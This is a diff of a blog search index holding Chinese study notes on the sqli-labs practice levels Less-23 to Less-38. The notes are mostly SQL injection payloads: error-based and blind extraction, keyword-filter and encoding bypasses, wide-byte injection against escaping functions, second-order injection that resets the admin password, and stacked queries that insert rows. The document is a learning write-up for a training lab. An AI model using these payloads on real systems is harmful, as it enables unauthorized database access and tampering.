@@ -105,6 +105,154 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-lab Less 23-Less 38</title>
+    <url>/2020/09/06/Sqli-lab-Less-23-Less-38/</url>
+    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-23-Less-38"><a href="#Sqli-lab-过关笔记-Less-23-Less-38" class="headerlink" title="Sqli-lab 过关笔记 Less 23-Less 38"></a>Sqli-lab 过关笔记 Less 23-Less 38</h1><a id="more"></a>
+<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>首先测试语句闭合方式，熟悉的GET熟悉的配方不同的味道<br>输入单引号后爆错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<p>确实是单引号闭合<br>接着闭合单引号</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 -- SSS </span></span><br></pre></td></tr></table></figure>
+<p>爆出<code>SSS&#39; LIMIT 0,1</code><br>emm，既然这样闭合不行那就换个思路</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>页面无报错无回显<br><img src="https://i.loli.net/2020/09/06/TcoWmxla8qJhbL4.jpg" alt="2~R_V_F_YTE2_MIUKFL_X_M.jpg"><br>嘻嘻嘻接下来试试报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>爆出<code>XPATH syntax error: &#39;~security~&#39;</code>，成功</p>
+<hr>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>嗯，看上去应该是二次注入</p>
+<p>这是我的理解<br><img src="https://i.loli.net/2020/09/06/Uw8WFfAiQYr5gkC.png" alt="image.png"></p>
+<p>知道上面简单的原理后先来注册一个新用户<br><img src="https://i.loli.net/2020/09/06/ad8iYHkBKItSN9z.png" alt="image.png"></p>
+<p>提示<br><code>Redirecting you to login page in 5 sec................</code><br><code>If it does not redirect, click the home button on top right</code></p>
+<p>我们去看看数据库存储的东西<br><img src="https://i.loli.net/2020/09/06/Ga7UI31LxB9NjWb.png" alt="image.png"><br>确实用户名被设置成了<code>admin&#39; --+</code></p>
+<p>我们去登录这个用户，出现登录界面全白<br><img src="https://i.loli.net/2020/09/06/WpqC54PQ3gImDwA.png" alt="image.png"></p>
+<p>清除cookies去点击重置密码出现<br><img src="https://i.loli.net/2020/09/06/aoiy2E48xtMmKGu.png" alt="image.png"></p>
+<p>我淦nm，这玩个luan，，，<br>打开关卡目录发现<br><img src="https://i.loli.net/2020/09/06/GbWR4VBkhm1tNY7.png" alt="image.png"><br>恍然大悟<br><img src="https://i.loli.net/2020/09/06/TcoWmxla8qJhbL4.jpg" alt="2~R_V_F_YTE2_MIUKFL_X_M.jpg"><br>赶紧修复继续</p>
+<p>登入后修改密码欸嘿<br><img src="https://i.loli.net/2020/09/06/nBgMjqb2zAk3Dut.png" alt="image.png"></p>
+<p>然后碰到点小的问题<br>注释有点问题于是就改成<code>admin&#39;#</code><br>然后再次登录修改<br>这里被解释后就会把admin的密码更新为我们设置的密码<br><img src="https://i.loli.net/2020/09/06/PubKj3qLGNAe2tX.png" alt="image.png"></p>
+<hr>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>判断闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 1=1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>回显了<br><code>Hint: Your Input is Filtered with following result: 1&#39; 1=1 &#39;1&#39;=&#39;1</code><br>过滤了and和or</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1=1 || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>回显<code>Hint: Your Input is Filtered with following result: 1&#39; </code><br>看来不行</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; %26%26 1=1 -- SS </span></span><br></pre></td></tr></table></figure>
+<p>这时换个编码，欸嘿成功</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; %26%26 updatexml(1,concat(0x7e,(select database()),0x7e),1) -- SS </span></span><br></pre></td></tr></table></figure>
+<p><code>XPATH syntax error: &#39;~security~&#39;</code><br>同样用字符包含</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; anandd updatexml(1,concat(0x7e,(select database()),0x7e),1) oorr &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这里也是过滤and和or<br>这里单引号双引号都报错说明是数字型注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aandnd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">20</span><span class="comment">--%20</span></span><br></pre></td></tr></table></figure>
+<p>没有回显，但单输入1可以有正确回显<br>说明这题不能使用报错注入，只能使用联合查询或者盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> #  </span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> ANANDD if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这里的过滤非常严格，%0a这一类的绕过空格<br>且报错没关所以这里使用报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>这里一样贴上上一关的payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>并没有报错，所以这里我们使用延时注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;%26%26if(length(database())=8,sleep(5),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>这里在上面的基础上又过滤掉了<code>union</code> <code>select</code><br>而且select用三次重写，union用两次重写<br>这里直接贴上报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;||updatexml(1,concat(0x7e,(seleselselectectct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;</span>security<span class="string">&#x27;%0alimit%0a0,1),0x7e),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>还是过滤<code>union</code> <code>select</code>，看看过滤程度<br>还是三次重写解决,union用两次重写<br>这里单引号不报错，双引号报错发现是双引号闭合且无报错提示<br>所以使用盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;%26%26substring(database(),1,1)=&#x27;d&#x27;%26%26&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"># 无回显</span><br><span class="line">&quot;%26%26substring(database(),1,1)=&#x27;s&#x27;%26%26&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"># 回显正常</span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>同样先探测闭合方式<br>确认是单引号闭合</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;)union select 1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; &#x27;)unionselect1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤空格使<span class="keyword">select</span>失效</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;)aunion%0aselect%0a1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; &#x27;)1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤<span class="keyword">union</span> <span class="keyword">select</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;)uunionnion%0aselselectect%0a1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt;&#x27;)uunionnion selselectect 1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>重写无效</span><br></pre></td></tr></table></figure>
+<p>看来是检查select和union之间的有效连接</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">999</span><span class="string">&#x27;)union%0adistinct%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0a||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; union distinct select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() ||(&#x27;1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>和上题一样只不过少了一些过滤</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">99</span><span class="string">&#x27;)union distinct select 1,database(),3||(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>回显正常<br>成功</p>
+<hr>
+<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>首先确定闭合方式为单引号闭合</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">99</span><span class="string">&#x27; union select 1,database(),3 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<p>盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>bool盲注</span><br><span class="line"><span class="string">&#x27; and length(database())=9 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>时间盲注</span><br><span class="line"><span class="string">&#x27; and if(length(database())=8,sleep(5),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<p>报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功<br>这里好像要自己加载waf，这里就不做继续</p>
+<hr>
+<h2 id="Less-29a"><a href="#Less-29a" class="headerlink" title="Less-29a"></a>Less-29a</h2><p>双引号闭合<br>也是需要自己加载waf</p>
+<hr>
+<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>单引号闭合<br>需要自己加载waf</p>
+<hr>
+<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>“)闭合<br>需要自己加waf</p>
+<hr>
+<blockquote>
+<p>以上waf关卡不知道是我的问题还是关卡问题需要自己加载waf<br>由于特地绕过一段时间，这里不做练习</p>
+</blockquote>
+<hr>
+<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><blockquote>
+<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p>
+</blockquote>
+<p>这里我们使用宽字节注入，在前边添加%df,形成%df%27来过掉%5c</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>成功<br>而后面的</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--&gt; %df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span></span><br></pre></td></tr></table></figure>
+<p>hex编码绕过</p>
+<hr>
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>这里的文件和Less-32一样，不做练习</p>
+<hr>
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这是一个POST类型的宽字节注入<br>首先抓包扔burp</p>
+<p>测试uname</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">%</span>df<span class="string">&#x27;&amp;passwd=1&amp;submit=Submit --&gt; 1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>测试passwd</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;&amp;submit=Submit --&gt; &#x27;</span><span class="number">1</span>�\<span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>都存在注入<br>接着</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2 #&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=admin &amp;passwd=1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span> #<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>回显正常，成功</p>
+<hr>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>试了半天宽字节后发现tm直接能注<br>也不知道是不是我的bug</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span> #</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span> #</span><br></pre></td></tr></table></figure>
+<p>回显成功</p>
+<hr>
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>显注，盲注，报错注入，宽字节注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3 %23</span></span><br><span class="line"><span class="string">%df&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="operator">%</span>df <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span>df<span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span></span><br></pre></td></tr></table></figure>
+<p>成功<br>这里不能直接用#来进行注释，用%23</p>
+<p>这里mysql的real_escape_strings</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line"></span><br><span class="line">来自：w3school</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这题和上题一样是bypass mysql_real_escape_strings</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2 %23&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>宽字节绕过，成功</p>
+<hr>
+<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>估计也是宽字节注入，只不过</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,(concat(0,(select database()),0x0)),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>回显成功</p>
+<p><code>stacked query（堆叠查询）</code>的适用条件</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PHP <span class="operator">-</span> <span class="keyword">Not</span> supported (supported <span class="keyword">by</span> MySQL <span class="keyword">for</span> other API).</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span> Server<span class="operator">/</span><span class="keyword">Any</span> API <span class="operator">-</span> Supported.</span><br><span class="line"></span><br><span class="line">Oracle<span class="operator">/</span><span class="keyword">Any</span> API <span class="operator">-</span> <span class="keyword">Not</span> supported.</span><br></pre></td></tr></table></figure>
+<p>很高的局限性哈</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3;insert into users values(1,&#x27;</span>Sunr<span class="string">&#x27;,&#x27;</span>Sunr<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
+<p>然后我们来看<br><img src="https://i.loli.net/2020/09/07/RBweZOCoJ5l9kxT.png" alt="image.png"><br>确定被插入</p>
+<p>使用堆叠注入我们可以用分号分隔开sql语句，但回显的只有第一条，但是后面拼接的可以实现增删改，甚至可以写shell</p>
+<p><a href="https://www.sqlinjection.net/stacked-queries/">相关资料</a></p>
+<p>就到这里</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>sqli-lab</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-lab Less 1-Less 10</title>
     <url>/2020/08/09/sqli-lab-Less-1-Less-10/</url>
     <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-1-Less-10"><a href="#Sqli-lab-过关笔记-Less-1-Less-10" class="headerlink" title="Sqli-lab 过关笔记 Less 1-Less 10"></a>Sqli-lab 过关笔记 Less 1-Less 10</h1><a id="more"></a>
@@ -339,154 +487,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-lab Less 23-Less 38</title>
-    <url>/2020/09/06/Sqli-lab-Less-23-Less-38/</url>
-    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-23-Less-38"><a href="#Sqli-lab-过关笔记-Less-23-Less-38" class="headerlink" title="Sqli-lab 过关笔记 Less 23-Less 38"></a>Sqli-lab 过关笔记 Less 23-Less 38</h1><a id="more"></a>
-<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>首先测试语句闭合方式，熟悉的GET熟悉的配方不同的味道<br>输入单引号后爆错</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
-<p>确实是单引号闭合<br>接着闭合单引号</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 -- SSS </span></span><br></pre></td></tr></table></figure>
-<p>爆出<code>SSS&#39; LIMIT 0,1</code><br>emm，既然这样闭合不行那就换个思路</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
-<p>页面无报错无回显<br><img src="https://i.loli.net/2020/09/06/TcoWmxla8qJhbL4.jpg" alt="2~R_V_F_YTE2_MIUKFL_X_M.jpg"><br>嘻嘻嘻接下来试试报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>爆出<code>XPATH syntax error: &#39;~security~&#39;</code>，成功</p>
-<hr>
-<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>嗯，看上去应该是二次注入</p>
-<p>这是我的理解<br><img src="https://i.loli.net/2020/09/06/Uw8WFfAiQYr5gkC.png" alt="image.png"></p>
-<p>知道上面简单的原理后先来注册一个新用户<br><img src="https://i.loli.net/2020/09/06/ad8iYHkBKItSN9z.png" alt="image.png"></p>
-<p>提示<br><code>Redirecting you to login page in 5 sec................</code><br><code>If it does not redirect, click the home button on top right</code></p>
-<p>我们去看看数据库存储的东西<br><img src="https://i.loli.net/2020/09/06/Ga7UI31LxB9NjWb.png" alt="image.png"><br>确实用户名被设置成了<code>admin&#39; --+</code></p>
-<p>我们去登录这个用户，出现登录界面全白<br><img src="https://i.loli.net/2020/09/06/WpqC54PQ3gImDwA.png" alt="image.png"></p>
-<p>清除cookies去点击重置密码出现<br><img src="https://i.loli.net/2020/09/06/aoiy2E48xtMmKGu.png" alt="image.png"></p>
-<p>我淦nm，这玩个luan，，，<br>打开关卡目录发现<br><img src="https://i.loli.net/2020/09/06/GbWR4VBkhm1tNY7.png" alt="image.png"><br>恍然大悟<br><img src="https://i.loli.net/2020/09/06/TcoWmxla8qJhbL4.jpg" alt="2~R_V_F_YTE2_MIUKFL_X_M.jpg"><br>赶紧修复继续</p>
-<p>登入后修改密码欸嘿<br><img src="https://i.loli.net/2020/09/06/nBgMjqb2zAk3Dut.png" alt="image.png"></p>
-<p>然后碰到点小的问题<br>注释有点问题于是就改成<code>admin&#39;#</code><br>然后再次登录修改<br>这里被解释后就会把admin的密码更新为我们设置的密码<br><img src="https://i.loli.net/2020/09/06/PubKj3qLGNAe2tX.png" alt="image.png"></p>
-<hr>
-<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>判断闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 1=1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>回显了<br><code>Hint: Your Input is Filtered with following result: 1&#39; 1=1 &#39;1&#39;=&#39;1</code><br>过滤了and和or</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1=1 || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>回显<code>Hint: Your Input is Filtered with following result: 1&#39; </code><br>看来不行</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; %26%26 1=1 -- SS </span></span><br></pre></td></tr></table></figure>
-<p>这时换个编码，欸嘿成功</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; %26%26 updatexml(1,concat(0x7e,(select database()),0x7e),1) -- SS </span></span><br></pre></td></tr></table></figure>
-<p><code>XPATH syntax error: &#39;~security~&#39;</code><br>同样用字符包含</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; anandd updatexml(1,concat(0x7e,(select database()),0x7e),1) oorr &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这里也是过滤and和or<br>这里单引号双引号都报错说明是数字型注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aandnd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">20</span><span class="comment">--%20</span></span><br></pre></td></tr></table></figure>
-<p>没有回显，但单输入1可以有正确回显<br>说明这题不能使用报错注入，只能使用联合查询或者盲注</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> #  </span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> ANANDD if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这里的过滤非常严格，%0a这一类的绕过空格<br>且报错没关所以这里使用报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>这里一样贴上上一关的payload</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>并没有报错，所以这里我们使用延时注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;%26%26if(length(database())=8,sleep(5),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>这里在上面的基础上又过滤掉了<code>union</code> <code>select</code><br>而且select用三次重写，union用两次重写<br>这里直接贴上报错注入</p>
